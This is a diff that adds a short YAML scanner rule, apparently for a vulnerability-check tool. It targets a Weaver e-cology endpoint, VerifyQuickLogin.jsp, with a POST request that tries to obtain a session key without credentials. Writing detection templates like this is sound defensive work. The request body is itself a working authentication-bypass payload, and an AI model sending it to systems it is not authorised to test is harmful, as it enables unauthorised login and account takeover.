@@ -1,0 +1,10 @@
+name: weaver-ecology-verify-quick-login-user-login
+rules:
+  - method: POST
+    path: "/mobile/plugin/VerifyQuickLogin.jsp"
+    body: 
+      "identifier=1&language=1&ipaddress=x.x.x.x"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"sessionkey":') && response.body.bcontains(b'"message":')
+detail:
+  author: 666
